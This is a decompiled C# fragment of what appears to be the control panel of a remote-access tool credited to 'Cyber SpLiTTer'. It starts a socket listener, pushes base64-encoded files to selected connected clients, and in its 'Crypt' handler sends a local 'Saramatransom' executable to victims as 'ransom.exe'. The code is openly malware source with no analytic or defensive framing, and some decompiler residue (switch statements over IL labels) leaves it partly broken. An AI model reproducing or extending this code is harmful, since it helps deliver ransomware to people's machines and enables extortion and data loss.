		// Token: 0x060000A2 RID: 162 RVA: 0x000025DC File Offset: 0x000007DC
		private void method_7(object sender, LinkLabelLinkClickedEventArgs e)
		{
			Class2.umavbhbSM.Form7.Show();
		}

		// Token: 0x060000A3 RID: 163 RVA: 0x00006B68 File Offset: 0x00004D68
		private void method_8(object sender, LinkLabelLinkClickedEventArgs e)
		{
			MessageBox.Show("By Cyber SpLiTTer", "  Coded", MessageBoxButtons.OK);
		}

		// Token: 0x060000A4 RID: 164 RVA: 0x000025EF File Offset: 0x000007EF
		private void Button1_Click(object sender, EventArgs e)
		{
			Class2.umavbhbSM.Form6.Show();
		}

		// Token: 0x060000A5 RID: 165 RVA: 0x00006B88 File Offset: 0x00004D88
		private void Button2_Click(object sender, EventArgs e)
		{
			this.s = new SocketServer();
			string text = this.TextBox1.Text;
			this.s.Start(Conversions.ToInteger(text));
			this.ProgressBar2.Value = 100;
			this.Button2.Enabled = false;
			this.Label3.Text = "Listening Started....";
		}

		// Token: 0x060000A6 RID: 166 RVA: 0x0000696C File Offset: 0x00004B6C
		private void UpdateToolStripMenuItem_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.ShowDialog();
			FileInfo fileInfo = new FileInfo(openFileDialog.FileName);
			if (openFileDialog.FileName.Length > 0)
			{
				try
				{
					foreach (object obj in this.l1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						this.s.Send(Conversions.ToInteger(listViewItem.ToolTipText), "sendfile||" + fileInfo.Name + "||" + Convert.ToBase64String(File.ReadAllBytes(openFileDialog.FileName)));
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}

		// Token: 0x060000A7 RID: 167 RVA: 0x00002627 File Offset: 0x00000827
		private void Button3_Click(object sender, EventArgs e)
		{
			Class2.umavbhbSM.Form4.Show();
		}

		// Token: 0x060000A8 RID: 168 RVA: 0x00006BE8 File Offset: 0x00004DE8
		private void method_9(object sender, EventArgs e)
		{
			int num;
			int num4;
			object obj;
			try
			{
				IL_01:
				ProjectData.ClearProjectError();
				num = -2;
				IL_09:
				int num2 = 2;
				this.Label1.Text = this.string_0.Replace("x", Conversions.ToString(this.l1.Items.Count)).Replace("y", Conversions.ToString(this.l1.SelectedItems.Count)).Replace("p", this.str);
				IL_6A:
				goto IL_CA;
				IL_6C:
				int num3 = num4 + 1;
				num4 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
				IL_86:
				goto IL_BF;
				IL_88:
				num4 = num2;
				if (num <= -2)
				{
					goto IL_6C;
				}
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
				IL_9D:;
			}
			catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
			{
				Exception ex = (Exception)obj2;
				goto IL_88;
			}
			IL_BF:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_CA:
			if (num4 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x060000A9 RID: 169 RVA: 0x000025ED File Offset: 0x000007ED
		private void RansomToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060000AA RID: 170 RVA: 0x00006CD8 File Offset: 0x00004ED8
		private void CryptToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\Saramatransom[Don`t_Run].exe";
			try
			{
				foreach (object obj in this.l1.SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					this.s.Send(Conversions.ToInteger(listViewItem.ToolTipText), string.Concat(new string[]
					{
						"ransom",
						this.Yy,
						"ransom.exe",
						this.Yy,
						Convert.ToBase64String(File.ReadAllBytes(path))
					}));
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x060000AB RID: 171 RVA: 0x000025ED File Offset: 0x000007ED
		private void DecryptToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0400001A RID: 26
		private static List<WeakReference> list_0;

		// Token: 0x0400001C RID: 28
		[AccessedThroughProperty("MenuStrip1")]
		private MenuStrip _MenuStrip1;

		// Token: 0x0400001D RID: 29
		[AccessedThroughProperty("ContextMenuStrip1")]
		private ContextMenuStrip _ContextMenuStrip1;

		// Token: 0x0400001E RID: 30
		[AccessedThroughProperty("RemoveClientToolStripMenuItem")]
		private ToolStripMenuItem _RemoveClientToolStripMenuItem;

		// Token: 0x0400001F RID: 31
		[AccessedThroughProperty("l1")]
		private ListView _l1;

		// Token: 0x04000020 RID: 32
		[AccessedThroughProperty("ColumnHeader1")]
		private ColumnHeader columnHeader_0;

		// Token: 0x04000021 RID: 33
		[AccessedThroughProperty("ColumnHeader2")]
		private ColumnHeader columnHeader_1;

		// Token: 0x04000022 RID: 34
		[AccessedThroughProperty("ColumnHeader3")]
		private ColumnHeader columnHeader_2;

		// Token: 0x04000023 RID: 35
		[AccessedThroughProperty("ColumnHeader4")]
		private ColumnHeader columnHeader_3;

		// Token: 0x04000024 RID: 36
		[AccessedThroughProperty("ColumnHeader5")]
		private ColumnHeader columnHeader_4;

		// Token: 0x04000025 RID: 37
		[AccessedThroughProperty("ContextMenuStrip2")]
		private ContextMenuStrip contextMenuStrip_0;

		// Token: 0x04000026 RID: 38
		[AccessedThroughProperty("AddPortToolStripMenuItem")]
		private ToolStripMenuItem _AddPortToolStripMenuItem;

		// Token: 0x04000027 RID: 39
		[AccessedThroughProperty("RemovePortToolStripMenuItem")]
		private ToolStripMenuItem _RemovePortToolStripMenuItem;

		// Token: 0x04000028 RID: 40
		[AccessedThroughProperty("ImageList2")]
		private ImageList imageList_0;

		// Token: 0x04000029 RID: 41
		[AccessedThroughProperty("RunFileToolStripMenuItem")]
		private ToolStripMenuItem _RunFileToolStripMenuItem;

		// Token: 0x0400002A RID: 42
		[AccessedThroughProperty("DiskToolStripMenuItem")]
		private ToolStripMenuItem _DiskToolStripMenuItem;

		// Token: 0x0400002B RID: 43
		[AccessedThroughProperty("LinkToolStripMenuItem")]
		private ToolStripMenuItem _LinkToolStripMenuItem;

		// Token: 0x0400002C RID: 44
		[AccessedThroughProperty("ImageList1")]
		private ImageList imageList_1;

		// Token: 0x0400002D RID: 45
		[AccessedThroughProperty("Button2")]
		private Button _Button2;

		// Token: 0x0400002E RID: 46
		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		// Token: 0x0400002F RID: 47
		[AccessedThroughProperty("Button3")]
		private Button _Button3;

		// Token: 0x04000030 RID: 48
		[AccessedThroughProperty("UpdateToolStripMenuItem")]
		private ToolStripMenuItem _UpdateToolStripMenuItem;

		// Token: 0x04000031 RID: 49
		[AccessedThroughProperty("Timer1")]
		private Timer timer_0;

		// Token: 0x04000032 RID: 50
		[AccessedThroughProperty("Label1")]
		private Label _Label1;

		// Token: 0x04000033 RID: 51
		[AccessedThroughProperty("RansomToolStripMenuItem")]
		private ToolStripMenuItem _RansomToolStripMenuItem;

		// Token: 0x04000034 RID: 52
		[AccessedThroughProperty("TextBox1")]
		private TextBox _TextBox1;

		// Token: 0x04000035 RID: 53
		[AccessedThroughProperty("Label2")]
		private Label _Label2;

		// Token: 0x04000036 RID: 54
		[AccessedThroughProperty("ProgressBar2")]
		private ProgressBar _ProgressBar2;

		// Token: 0x04000037 RID: 55
		[AccessedThroughProperty("CryptToolStripMenuItem")]
		private ToolStripMenuItem _CryptToolStripMenuItem;

		// Token: 0x04000038 RID: 56
		[AccessedThroughProperty("DecryptToolStripMenuItem")]
		private ToolStripMenuItem hxtBklasYe;

		// Token: 0x04000039 RID: 57
		[AccessedThroughProperty("Label3")]
		private Label _Label3;

		// Token: 0x0400003A RID: 58
		[AccessedThroughProperty("Panel1")]
		private Panel _Panel1;

		// Token: 0x0400003B RID: 59
		private string string_0;

		// Token: 0x0400003C RID: 60
		public string str;

		// Token: 0x0400003D RID: 61
		public string Yy;

		// Token: 0x0400003E RID: 62
		[AccessedThroughProperty("s")]
		private SocketServer socketServer_0;

		// Token: 0x0200000E RID: 14
		// (Invoke) Token: 0x060000AF RID: 175
		public delegate void _data(int sock, byte[] b);
	}
}
